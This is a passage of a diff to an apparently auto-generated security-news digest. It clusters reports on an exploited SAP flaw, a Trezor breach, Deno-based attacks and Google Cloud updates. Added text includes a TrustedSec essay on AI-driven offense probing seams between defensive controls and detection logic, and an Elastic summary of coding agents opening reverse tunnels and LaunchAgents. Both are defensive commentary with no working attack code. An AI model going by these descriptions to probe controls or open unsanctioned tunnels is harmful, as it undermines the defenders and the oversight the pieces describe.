   - Link: https://www.bleepingcomputer.com/news/security/max-severity-sap-commerce-cloud-flaw-now-targeted-in-attacks/
   - Summary: A maximum-severity SAP Commerce Cloud remote code execution vulnerability patched three days ago is already being targeted in attacks, according to threat intelligence company Defused. [...]
+
+### Cluster ab440398cd — score 9
+
+- Title: What’s new with Google Cloud
+- Source: Google Cloud Security (cloud_identity_infrastructure)
+- Published: 2026-08-14T16:00:00+00:00
+- Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: Google Cloud
+
+#### Cluster taxonomy (union across members)
+- affected_products: Google Cloud
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- affected_products: Google Cloud
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem
+```
+
+#### Full body
+
+```
+Inside Google Cloud What’s new with Google Cloud August 14, 2026 Google Cloud Content & Editorial Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gemini 3.5 and Google Cloud. Compete for your share of $190,000 in prizes, cash, and Google Cloud credits! Submissions are open from August 3, 2026, to August 31, 2026. Learn more and register . Sign up for GEAR to get exclusive updates and your badge. #AllThingsAgenticHackathon Accelerate PostgreSQL migrations using Gemini in Database Migration Service Enterprise database migrations often stall during the "last mile" of translating legacy stored procedures, triggers, and custom functions from Oracle or SQL Server. Database Migration Service (DMS) now provides AI-assisted code conversion powered by Gemini in Databases. By combining deterministic compiler rules for 1:1 syntax with Gemini contextual synthesis for complex procedural blocks, DMS converts legacy code into native PostgreSQL and AlloyDB with full schema awareness and side-by-side validation. Read the full blog post to learn how to streamline your database code conversion. Compute Flex CUDs now available for G2 and G4 GPU VMs Compute Flexible Committed Use Discounts (Flex CUDs) are now available for G2 (NVIDIA L4) and G4 (NVIDIA RTX Pro 6000) VMs . You can now lock in predictable savings while retaining the flexibility to adapt across VM families, migrate between regions, and combine general-purpose compute, GKE, Cloud Run, and G2 & G4 GPU VMs under a single spend commitment. Flex CUDs for G-series VMs let you lock in savings today while preserving the agility to upgrade to latest hardware without disruption! Explore VM instance pricing or learn more about Flex CUDs . Rapid Bucket accelerates the training and checkpoint performance in PyTorch Ecosystem via GCSFS With the release of GCSFS 2026.8.0 , organisations can now unlock maximum ROI from their AI/ML infrastructure by eliminating data starvation on GPUs in PyTorch ecosystem when they are using Frameworks like Dask, Pandas, PyTorch , PyTorch Lightning, Hugging Face Datasets, Ray dataetc. By making adaptive concurrent prefetching the default, GCSFS dynamically predicts and background-fetches sequential read patterns—boosting single-file throughput by 5x, and scaling up to 21 GiB/s , saturating the NIC when paired with Rapid Bucket . Saturating the NIC translates to significantly improved accelerator goodput and reduced training wait times with zero integration friction. Training and checkpoint restore workflows benefit from intelligent memory management that automatically drains the buffer during random reads to completely avoid bandwidth or memory penalties. Aug 3 - Aug 7 Navigate data sovereignty and AI innovation with hybrid cloud For enterprises facing strict compliance rules, keeping sensitive data on-premises often means missing out on cutting-edge AI. Data from the 2026 State of AI Infrastructure report reveals that 52% of IT leaders are adopting hybrid cloud strategies to
+```
+
+#### Corroborating sources (1)
+
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - Title: What’s new with Google Cloud
+  - Published: 2026-08-14T16:00:00+00:00
+  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
+  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem
 
 ### Cluster b3aa07bd4c — score 9
 
@@ -3625,16 +3576,20 @@ Risky Bulletin Podcast August 13, 2026 Srsly Risky Biz: Data extortion is boomin
 - Source: TrustedSec (detection_response_operations)
 - Published: 2026-08-13T04:00:00+00:00
 - Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
+- threat_categories: phishing_social_eng
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3644,6 +3599,12 @@ Risky Bulletin Podcast August 13, 2026 Srsly Risky Biz: Data extortion is boomin
 <p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>
 ```
 
+#### Full body
+
+```
+Blog AI Offense is Not Noclip Mode August 13, 2026 AI Offense is Not Noclip Mode Written by Justin Elze Artificial Intelligence (AI) Table of contents The Walls Are Real Reachability is the Variable Nobody Prices Why wp2shell Matters Ten Thousand Eyes Humans Are an Attack Surface Too AI Changes the Economics, Not the Requirements What Defenders Should Actually Do Persistence is Not a Skeleton Key References Everyone wants the cinematic version of offensive AI. The model finds a path nobody knew existed, ignores the controls, and lands on the objective using an attack class that did not previously exist. Noclip mode. Walk through the wall, skip the level. That framing is fun. It is also mostly wrong about the near-term risk. The practical advantage is more boring and more dangerous. AI makes it cheap to keep trying against attack paths we already understand. It can test more variations, explain why something failed, change approaches, connect findings across a codebase nobody has time to read end to end, and continue long after a human operator would have burned the engagement budget and moved on. That matters. It is also not magic, and the difference between those two statements is where most of the current commentary falls apart. The Walls Are Real Known attack paths generally have controls built around them. Conditional Access with device compliance and phishing-resistant authentication breaks a lot of credential abuse. WDAC or AppLocker in enforcement mode breaks a lot of execution. ASLR, DEP, CFG, CET, and the rest of the memory protection stack made entire exploit classes harder, less reliable, and more expensive. Segmentation limits movement. Tiered administration and LAPS limit what a foothold is worth. Rate limits, lockouts, logging, and behavioral detection still work at machine speed. A model does not reason its way past those controls because it tried hard enough. A blocked process is still blocked. A token that does not satisfy Conditional Access is still rejected. A memory corruption bug still has to survive whatever mitigations are compiled into the target. A host that cannot route to another segment does not acquire a route because someone wrote a better prompt. The problem is that almost nobody has one clean wall—a single, consistently enforced defensive boundary where the same controls apply everywhere. Instead, they have fifteen years of overlapping products, exceptions, legacy workflows, trusted paths, exclusions, stale systems, half-finished deployments, and controls enforced in one OU and left in audit mode in another. The result not exactly a wall, but a patchwork of defenses with gaps, seams, and inconsistent enforcement that attackers can work around. As I wrote in The Defensive Stack Is Exposed , the decision logic inside defensive products is increasingly part of the attack surface. Rules, thresholds, exclusions, trusted paths, and management states can now be studied together instead of one at a time. AI makes finding those seams cheaper. It can test every door, window, vent, service entrance, and badly patched section of drywall, compare versions, watch how the defensive product behaves, recover from dead ends, and keep refining until it finds the place where two controls do not quite overlap. Reachability is the Variable Nobody Prices There is another part of this conversation that keeps getting skipped: The attacker has to be able to reach the vulnerable surface. This is straightforward when the target is an unauthenticated Internet-facing application. Scan for it, send requests, and iterate without compromising anything first. Once the vulnerable component sits behind authentication, on an internal VLAN, inside a specific workflow, or behind a configuration almost nobody runs, the economics change. Now the attacker needs credentials, a foothold, routing, a particular role, a specific dependency version, or an earlier bug just to get within arm’s reach of the interesting code. That does not make t
+```
+
 #### Corroborating sources (1)
 
 - **TrustedSec** (detection_response_operations)
@@ -3651,39 +3612,6 @@ Risky Bulletin Podcast August 13, 2026 Srsly Risky Biz: Data extortion is boomin
   - Published: 2026-08-13T04:00:00+00:00
   - Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
   - Summary: <p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>
-
-### Cluster e2f458ad1f — score 8
-
-- Title: Living off the coding agent: Two tales of tunnels and LaunchAgents
-- Source: Elastic Security Labs (detection_response_operations)
-- Published: 2026-08-07T23:59:59+00:00
-- Link: https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Agent-parented reverse tunnels and LaunchAgents can expose a local admin app to the internet. Endpoint still needs to treat that as high severity even when the activity looks like vibe-coded ops, not confirmed malware.
-```
-
-#### Corroborating sources (1)
-
-- **Elastic Security Labs** (detection_response_operations)
-  - Title: Living off the coding agent: Two tales of tunnels and LaunchAgents
-  - Published: 2026-08-07T23:59:59+00:00
-  - Link: https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection
-  - Summary: Agent-parented reverse tunnels and LaunchAgents can expose a local admin app to the internet. Endpoint still needs to treat that as high severity even when the activity looks like vibe-coded ops, not confirmed malware.
 
 ### Cluster dff444ac7f — score 8
 
@@ -3718,42 +3646,38 @@ Attack TTPs combine fileless execution, wide LOLBin use Categories: Threat Resea
   - Link: https://www.sophos.com/en-us/blog/deno-case-studies
   - Summary: Attack TTPs combine fileless execution, wide LOLBin use Categories: Threat Research
 
-### Cluster c0649139f6 — score 8
+### Cluster e2f458ad1f — score 8
 
-- Title: Trezor discloses data breach affecting nearly 14,000 customers
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-08-13T15:13:19+00:00
-- Link: https://www.bleepingcomputer.com/news/security/trezor-discloses-data-breach-affecting-nearly-14-000-customers/
+- Title: Living off the coding agent: Two tales of tunnels and LaunchAgents
+- Source: Elastic Security Labs (detection_response_operations)
+- Published: 2026-08-07T23:59:59+00:00
+- Link: https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection
 - Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach
-- affected_industries: manufacturing_industrial
-- content_type: incident_report
-- confidence_tier: tier_4_news
+- content_type: news_report
+- confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: data_breach
-- affected_industries: manufacturing_industrial
-- content_type: incident_report
-- confidence_tier: tier_4_news
+- content_type: news_report
+- confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-Hardware wallet manufacturer Trezor disclosed a data breach affecting nearly 14,000 of its customers after ShipMonk, its shipping and logistics provider, was hacked [...]
+Agent-parented reverse tunnels and LaunchAgents can expose a local admin app to the internet. Endpoint still needs to treat that as high severity even when the activity looks like vibe-coded ops, not confirmed malware.
 ```
 
 #### Corroborating sources (1)
 
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Trezor discloses data breach affecting nearly 14,000 customers
-  - Published: 2026-08-13T15:13:19+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/trezor-discloses-data-breach-affecting-nearly-14-000-customers/
-  - Summary: Hardware wallet manufacturer Trezor disclosed a data breach affecting nearly 14,000 of its customers after ShipMonk, its shipping and logistics provider, was hacked [...]
+- **Elastic Security Labs** (detection_response_operations)
+  - Title: Living off the coding agent: Two tales of tunnels and LaunchAgents
+  - Published: 2026-08-07T23:59:59+00:00
+  - Link: https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection
+  - Summary: Agent-parented reverse tunnels and LaunchAgents can expose a local admin app to the internet. Endpoint still needs to treat that as high severity even when the activity looks like vibe-coded ops, not confirmed malware.
 
 ### Cluster a52785cdd9 — score 8
 
